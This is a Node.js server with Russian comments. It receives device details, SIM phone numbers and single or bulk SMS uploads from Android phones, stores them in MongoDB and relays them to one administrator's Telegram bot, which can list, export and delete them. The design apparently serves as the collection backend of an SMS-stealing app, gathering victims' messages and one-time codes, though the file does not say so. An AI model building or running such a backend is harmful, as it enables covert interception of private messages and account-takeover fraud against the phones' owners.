require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { Telegraf, Markup } = require('telegraf');
const mongoose = require('mongoose');
const Device = require('./models/Device');
const SmsMessage = require('./models/SmsMessage');
const moment = require('moment');

// Константы из .env
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_USER_ID = process.env.ADMIN_USER_ID;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/izi_db';
const PORT = process.env.PORT || 3000;

// Инициализация Express
const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Инициализация Telegram бота
const bot = new Telegraf(BOT_TOKEN);

// Глобальный доступ к боту для возможности отправки уведомлений из любого места кода
global.bot = bot.telegram;

// Подключение к MongoDB
mongoose.connect(MONGODB_URI)
  .then(() => {
    console.log('Подключено к MongoDB');
  })
  .catch((err) => {
    console.error('Ошибка подключения к MongoDB:', err);
  });

// Корневой маршрут для проверки работоспособности
app.get('/', (req, res) => {
  res.send('Сервер работает!');
});

// API маршруты
// 1. Регистрация устройства
app.post('/api/register-device', async (req, res) => {
  try {
    const { deviceId, deviceModel, androidVersion, simCards } = req.body;
    console.log(`Получен запрос на регистрацию устройства: ${deviceId}, ${deviceModel}`);

    if (!deviceId || !deviceModel) {
      return res.status(400).json({
        success: false,
        message: 'Отсутствуют обязательные поля'
      });
    }

    // Проверяем, существует ли устройство
    let device = await Device.findOne({ deviceId });

    if (device) {
      // Обновляем существующее устройство
      device.deviceModel = deviceModel;
      device.androidVersion = androidVersion;
      device.simCards = simCards;
      device.lastActiveAt = new Date();
      await device.save();
      console.log(`Устройство ${deviceId} обновлено`);
    } else {
      // Создаем новое устройство
      device = new Device({
        deviceId,
        deviceModel,
        androidVersion,
        simCards
      });
      await device.save();
      console.log(`Новое устройство ${deviceId} зарегистрировано`);

      // Отправляем уведомление в Telegram
      await notifyNewDevice(device);
    }

    res.status(200).json({
      success: true,
      message: 'Устройство успешно зарегистрировано',
      data: device
    });
  } catch (error) {
    console.error('Ошибка при регистрации устройства:', error);
    res.status(500).json({
      success: false,
      message: 'Ошибка сервера',
      error: error.message
    });
  }
});

// 2. Получение SMS
app.post('/api/send-sms', async (req, res) => {
  try {
    const { sender, text, timestamp, simSlot, deviceId } = req.body;
    console.log(`Получено SMS от ${sender} на устройство ${deviceId}, слот ${simSlot}`);

    if (!sender || !text || !deviceId) {
      return res.status(400).json({
        success: false,
        message: 'Отсутствуют обязательные поля'
      });
    }

    // Проверяем, существует ли устройство
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Устройство не найдено'
      });
    }

    // Обновляем время последней активности
    device.lastActiveAt = new Date();
    await device.save();

    // Сохраняем SMS
    const smsMessage = new SmsMessage({
      sender,
      text,
      timestamp: timestamp ? new Date(timestamp) : new Date(),
      simSlot,
      deviceId
    });
    await smsMessage.save();
    console.log(`SMS от ${sender} сохранено в базе данных`);

    // Отправляем уведомление в Telegram
    await notifyNewSms(smsMessage, device);

    res.status(200).json({
      success: true,
      message: 'SMS успешно получено',
      data: smsMessage
    });
  } catch (error) {
    console.error('Ошибка при получении SMS:', error);
    res.status(500).json({
      success: false,
      message: 'Ошибка сервера',
      error: error.message
    });
  }
});

// 3. Получение массива SMS
app.post('/api/send-all-sms', async (req, res) => {
  try {
    const messages = req.body;
    console.log(`Получен массив из ${messages.length} SMS сообщений`);

    if (!Array.isArray(messages) || messages.length === 0) {
      return res.status(400).json({
        success: false,
        message: 'Массив сообщений пуст или некорректен'
      });
    }

    // Получаем deviceId из первого сообщения
    const deviceId = messages[0].deviceId;
    if (!deviceId) {
      return res.status(400).json({
        success: false,
        message: 'Отсутствует deviceId'
      });
    }

    // Проверяем, существует ли устройство
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Устройство не найдено'
      });
    }

    // Обновляем время последней активности
    device.lastActiveAt = new Date();
    await device.save();

    // Сохраняем все сообщения
    const savedMessages = [];
    for (const message of messages) {
      const { sender, text, timestamp, simSlot } = message;
      
      const smsMessage = new SmsMessage({
        sender,
        text,
        timestamp: timestamp ? new Date(timestamp) : new Date(),
        simSlot: simSlot || 0,
        deviceId
      });
      await smsMessage.save();
      savedMessages.push(smsMessage);
    }
    console.log(`Сохранено ${savedMessages.length} SMS сообщений`);

    // Отправляем уведомление в Telegram
    await notifyBulkSmsUpload(savedMessages.length, device);

    res.status(200).json({
      success: true,
      message: `Сохранено ${savedMessages.length} SMS сообщений`,
      data: { count: savedMessages.length }
    });
  } catch (error) {
    console.error('Ошибка при массовом сохранении SMS:', error);
    res.status(500).json({
      success: false,
      message: 'Ошибка сервера',
      error: error.message
    });
  }
});

// Функции для отправки уведомлений в Telegram
// 1. Уведомление о новом устройстве
async function notifyNewDevice(device) {
  try {
    if (!global.bot) return;
    
    console.log(`Отправляем уведомление о новом устройстве ${device.deviceId} в Telegram`);
    
    let message = `🔔 *Зарегистрировано новое устройство!*\n\n`;
    message += `📱 *Модель:* ${device.deviceModel}\n`;
    message += `🆔 *ID:* \`${device.deviceId}\`\n`;
    message += `📱 *Android:* ${device.androidVersion}\n`;
    
    if (device.simCards && device.simCards.length > 0) {
      message += `\n📶 *SIM-карты:*\n`;
      for (const sim of device.simCards) {
        message += `SIM${sim.slotIndex + 1}: ${sim.phoneNumber || 'Номер неизвестен'} (${sim.operatorName || 'Оператор неизвестен'})\n`;
      }
    }
    
    await global.bot.sendMessage(ADMIN_USER_ID, message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📱 Информация об устройстве', callback_data: `device:${device.deviceId}` }]
        ]
      }
    });
    console.log('Уведомление о новом устройстве отправлено');
  } catch (error) {
    console.error('Ошибка при отправке уведомления о новом устройстве:', error);
  }
}

// 2. Уведомление о новом SMS
async function notifyNewSms(smsMessage, device) {
  try {
    if (!global.bot) return;
    
    console.log(`Отправляем уведомление о новом SMS от ${smsMessage.sender} в Telegram`);
    
    let message = `✉️ *Новое SMS сообщение!*\n\n`;
    message += `📱 *Устройство:* ${device.deviceModel}\n`;
    message += `🆔 *ID:* \`${device.deviceId}\`\n`;
    message += `📱 *От:* ${smsMessage.sender}\n`;
    message += `📶 *SIM:* SIM${smsMessage.simSlot + 1}\n`;
    message += `🕒 *Время:* ${moment(smsMessage.timestamp).format('DD.MM.YYYY HH:mm')}\n\n`;
    message += `💬 *Текст:*\n${smsMessage.text}`;
    
    await global.bot.sendMessage(ADMIN_USER_ID, message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📱 Информация об устройстве', callback_data: `device:${device.deviceId}` }]
        ]
      }
    });
    console.log('Уведомление о новом SMS отправлено');
  } catch (error) {
    console.error('Ошибка при отправке уведомления о новом SMS:', error);
  }
}

// 3. Уведомление о массовой загрузке SMS
async function notifyBulkSmsUpload(count, device) {
  try {
    if (!global.bot) return;
    
    console.log(`Отправляем уведомление о загрузке ${count} SMS в Telegram`);
    
    let message = `📥 *Загружены SMS сообщения!*\n\n`;
    message += `📱 *Устройство:* ${device.deviceModel}\n`;
    message += `🆔 *ID:* \`${device.deviceId}\`\n`;
    message += `✉️ *Количество:* ${count} сообщений\n`;
    
    await global.bot.sendMessage(ADMIN_USER_ID, message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📱 Информация об устройстве', callback_data: `device:${device.deviceId}` }],
          [{ text: '✉️ Просмотр SMS', callback_data: `sms:${device.deviceId}` }]
        ]
      }
    });
    console.log('Уведомление о массовой загрузке SMS отправлено');
  } catch (error) {
    console.error('Ошибка при отправке уведомления о массовой загрузке SMS:', error);
  }
}

// Настройка бота Telegram
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // Проверка, является ли пользователь администратором
  if (userId === ADMIN_USER_ID) {
    await ctx.reply('Добро пожаловать в панель управления! Выберите действие:', {
      reply_markup: {
        inline_keyboard: [
          [{ text: '📱 Список устройств', callback_data: 'devices' }]
        ]
      }
    });
  } else {
    await ctx.reply('Извините, у вас нет доступа к этому боту.');
  }
});

// Обработка колбэков от инлайн-кнопок
bot.on('callback_query', async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // Проверка, является ли пользователь администратором
  if (userId !== ADMIN_USER_ID) {
    await ctx.answerCbQuery('У вас нет доступа к этой функции');
    return;
  }

  const data = ctx.callbackQuery.data;
  
  try {
    // Удаляем уведомление о колбэке
    await ctx.answerCbQuery();
    
    if (data === 'devices') {
      // Список устройств
      await showDevicesList(ctx);
    } else if (data.startsWith('device:')) {
      // Детали устройства
      const deviceId = data.split(':')[1];
      await showDeviceDetails(ctx, deviceId);
    } else if (data.startsWith('sms:')) {
      // Список SMS для устройства
      const deviceId = data.split(':')[1];
      await showDeviceSms(ctx, deviceId);
    } else if (data.startsWith('export:')) {
      // Экспорт всех SMS для устройства
      const deviceId = data.split(':')[1];
      await exportAllSms(ctx, deviceId);
    } else if (data === 'back_to_devices') {
      // Возврат к списку устройств
      await showDevicesList(ctx);
    } else if (data === 'back_to_main') {
      // Возврат в главное меню
      await ctx.editMessageText('Выберите действие:', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Список устройств', callback_data: 'devices' }]
          ]
        }
      });
    } else if (data.startsWith('delete_device:')) {
      // Удаление устройства
      const deviceId = data.split(':')[1];
      await deleteDevice(ctx, deviceId);
    }
  } catch (error) {
    console.error('Ошибка при обработке колбэка:', error);
    await ctx.reply('Произошла ошибка при выполнении операции.');
  }
});

// Функции для обработки команд бота
// 1. Показ списка устройств
async function showDevicesList(ctx) {
  try {
    const devices = await Device.find().sort({ lastActiveAt: -1 });
    
    if (devices.length === 0) {
      await ctx.editMessageText('Устройства не найдены.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '🏠 Главное меню', callback_data: 'back_to_main' }]
          ]
        }
      });
      return;
    }
    
    let message = '📱 *Доступные устройства:*\n\n';
    const keyboard = [];
    
    for (const device of devices) {
      const lastActive = moment(device.lastActiveAt).format('DD.MM.YYYY HH:mm');
      
      message += `*${device.deviceModel}*\n`;
      message += `🆔 ID: \`${device.deviceId}\`\n`;
      message += `📱 Android: ${device.androidVersion}\n`;
      message += `📅 Активность: ${lastActive}\n`;
      message += `📶 SIM-карты: ${device.simCards.length}\n\n`;
      
      keyboard.push([{ text: `📱 ${device.deviceModel}`, callback_data: `device:${device.deviceId}` }]);
    }
    
    keyboard.push([{ text: '🏠 Главное меню', callback_data: 'back_to_main' }]);
    
    await ctx.editMessageText(message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: keyboard
      }
    });
  } catch (error) {
    console.error('Ошибка при получении списка устройств:', error);
    await ctx.reply('Произошла ошибка при получении списка устройств.');
  }
}

// 2. Показ деталей устройства
async function showDeviceDetails(ctx, deviceId) {
  try {
    const device = await Device.findOne({ deviceId });
    
    if (!device) {
      await ctx.editMessageText('Устройство не найдено.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Список устройств', callback_data: 'devices' }]
          ]
        }
      });
      return;
    }
    
    // Получаем количество SMS для устройства
    const smsCount = await SmsMessage.countDocuments({ deviceId });
    
    let message = `📱 *Устройство: ${device.deviceModel}*\n\n`;
    message += `🆔 ID: \`${device.deviceId}\`\n`;
    message += `📱 Android: ${device.androidVersion}\n`;
    message += `📅 Зарегистрировано: ${moment(device.registeredAt).format('DD.MM.YYYY HH:mm')}\n`;
    message += `📅 Активность: ${moment(device.lastActiveAt).format('DD.MM.YYYY HH:mm')}\n`;
    message += `✉️ SMS сообщений: ${smsCount}\n\n`;
    
    if (device.simCards && device.simCards.length > 0) {
      message += `📶 *SIM-карты:*\n`;
      for (const sim of device.simCards) {
        message += `SIM${sim.slotIndex + 1}: ${sim.phoneNumber || 'Номер неизвестен'} (${sim.operatorName || 'Оператор неизвестен'})\n`;
      }
    } else {
      message += `📶 *SIM-карты:* Информация отсутствует\n`;
    }
    
    const keyboard = [
      [{ text: '✉️ Просмотр SMS', callback_data: `sms:${deviceId}` }],
      [{ text: '📥 Экспорт всех SMS', callback_data: `export:${deviceId}` }],
      [{ text: '❌ Удалить устройство', callback_data: `delete_device:${deviceId}` }],
      [{ text: '📱 Список устройств', callback_data: 'back_to_devices' }],
      [{ text: '🏠 Главное меню', callback_data: 'back_to_main' }]
    ];
    
    await ctx.editMessageText(message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: keyboard
      }
    });
  } catch (error) {
    console.error('Ошибка при получении информации об устройстве:', error);
    await ctx.reply('Произошла ошибка при получении информации об устройстве.');
  }
}

// 3. Показ SMS для устройства
async function showDeviceSms(ctx, deviceId) {
  try {
    const device = await Device.findOne({ deviceId });
    
    if (!device) {
      await ctx.editMessageText('Устройство не найдено.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Список устройств', callback_data: 'devices' }]
          ]
        }
      });
      return;
    }
    
    // Получаем последние 10 SMS для устройства
    const messages = await SmsMessage.find({ deviceId })
      .sort({ timestamp: -1 })
      .limit(10);
    
    let message = `✉️ *Последние SMS для ${device.deviceModel}:*\n\n`;
    
    if (messages.length === 0) {
      message += 'SMS сообщения отсутствуют.';
    } else {
      for (const sms of messages) {
        message += `📱 *От:* ${sms.sender}\n`;
        message += `💬 *Текст:* ${sms.text}\n`;
        message += `🕒 *Время:* ${moment(sms.timestamp).format('DD.MM.YYYY HH:mm')}\n`;
        message += `📶 *SIM:* SIM${sms.simSlot + 1}\n\n`;
      }
    }
    
    const keyboard = [
      [{ text: '📥 Экспорт всех SMS', callback_data: `export:${deviceId}` }],
      [{ text: '📱 Информация об устройстве', callback_data: `device:${deviceId}` }],
      [{ text: '📱 Список устройств', callback_data: 'back_to_devices' }],
      [{ text: '🏠 Главное меню', callback_data: 'back_to_main' }]
    ];
    
    await ctx.editMessageText(message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: keyboard
      }
    });
  } catch (error) {
    console.error('Ошибка при получении SMS для устройства:', error);
    await ctx.reply('Произошла ошибка при получении SMS для устройства.');
  }
}

// 4. Экспорт всех SMS для устройства
async function exportAllSms(ctx, deviceId) {
  try {
    const device = await Device.findOne({ deviceId });
    
    if (!device) {
      await ctx.editMessageText('Устройство не найдено.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Список устройств', callback_data: 'devices' }]
          ]
        }
      });
      return;
    }
    
    // Получаем все SMS для устройства
    const messages = await SmsMessage.find({ deviceId }).sort({ timestamp: -1 });
    
    if (messages.length === 0) {
      await ctx.editMessageText('SMS сообщения отсутствуют.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Информация об устройстве', callback_data: `device:${deviceId}` }]
          ]
        }
      });
      return;
    }
    
    // Формируем текст для экспорта
    let exportText = `📱 *Экспорт SMS для ${device.deviceModel}*\n`;
    exportText += `📅 *Дата экспорта:* ${moment().format('DD.MM.YYYY HH:mm')}\n`;
    exportText += `📱 *Устройство:* ${device.deviceModel} (${device.androidVersion})\n`;
    exportText += `✉️ *Всего сообщений:* ${messages.length}\n\n`;
    exportText += `----------------------------------------------------------\n\n`;
    
    // Группируем сообщения по дням для удобства чтения
    const groupedMessages = {};
    for (const message of messages) {
      const date = moment(message.timestamp).format('DD.MM.YYYY');
      if (!groupedMessages[date]) {
        groupedMessages[date] = [];
      }
      groupedMessages[date].push(message);
    }
    
    // Формируем текст с группировкой по дням
    const dates = Object.keys(groupedMessages).sort((a, b) => 
      moment(b, 'DD.MM.YYYY').valueOf() - moment(a, 'DD.MM.YYYY').valueOf()
    );
    
    for (const date of dates) {
      exportText += `📅 *${date}*\n\n`;
      
      const dayMessages = groupedMessages[date].sort((a, b) => 
        b.timestamp.valueOf() - a.timestamp.valueOf()
      );
      
      for (const message of dayMessages) {
        exportText += `🕒 ${moment(message.timestamp).format('HH:mm')}\n`;
        exportText += `📱 От: ${message.sender}\n`;
        exportText += `📶 SIM${message.simSlot + 1}\n`;
        exportText += `💬 ${message.text}\n\n`;
      }
      
      exportText += `----------------------------------------------------------\n\n`;
    }
    
    // Если экспорт очень большой, разбиваем на части
    const maxLength = 4000; // Telegram ограничивает сообщения примерно до 4096 символов
    if (exportText.length > maxLength) {
      let parts = [];
      for (let i = 0; i < exportText.length; i += maxLength) {
        parts.push(exportText.substring(i, i + maxLength));
      }
      
      // Отправляем первую часть с заменой текущего сообщения
      await ctx.editMessageText(`Часть 1/${parts.length}\n\n${parts[0]}`, {
        parse_mode: 'Markdown'
      });
      
      // Отправляем остальные части как новые сообщения
      for (let i = 1; i < parts.length; i++) {
        await ctx.reply(`Часть ${i + 1}/${parts.length}\n\n${parts[i]}`, {
          parse_mode: 'Markdown'
        });
      }
      
      // Отправляем завершающее сообщение с кнопками
      await ctx.reply('Экспорт завершен', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Информация об устройстве', callback_data: `device:${deviceId}` }],
            [{ text: '📱 Список устройств', callback_data: 'back_to_devices' }],
            [{ text: '🏠 Главное меню', callback_data: 'back_to_main' }]
          ]
        }
      });
    } else {
      await ctx.editMessageText(exportText, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Информация об устройстве', callback_data: `device:${deviceId}` }],
            [{ text: '📱 Список устройств', callback_data: 'back_to_devices' }],
            [{ text: '🏠 Главное меню', callback_data: 'back_to_main' }]
          ]
        }
      });
    }
  } catch (error) {
    console.error('Ошибка при экспорте SMS:', error);
    await ctx.reply('Произошла ошибка при экспорте SMS.');
  }
}

// 5. Удаление устройства
async function deleteDevice(ctx, deviceId) {
  try {
    // Удаляем устройство и все его SMS
    await Device.deleteOne({ deviceId });
    await SmsMessage.deleteMany({ deviceId });
    
    await ctx.editMessageText('✅ Устройство и все его SMS успешно удалены.', {
      reply_markup: {
        inline_keyboard: [
          [{ text: '📱 Список устройств', callback_data: 'back_to_devices' }],
          [{ text: '🏠 Главное меню', callback_data: 'back_to_main' }]
        ]
      }
    });
  } catch (error) {
    console.error('Ошибка при удалении устройства:', error);
    await ctx.reply('Произошла ошибка при удалении устройства.');
  }
}

// Запуск сервера
app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});

// Запуск бота
bot.launch()
  .then(() => console.log('Telegram бот запущен'))
  .catch(err => console.error('Ошибка запуска Telegram бота:', err));

// Обработка сигналов завершения
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM')); 
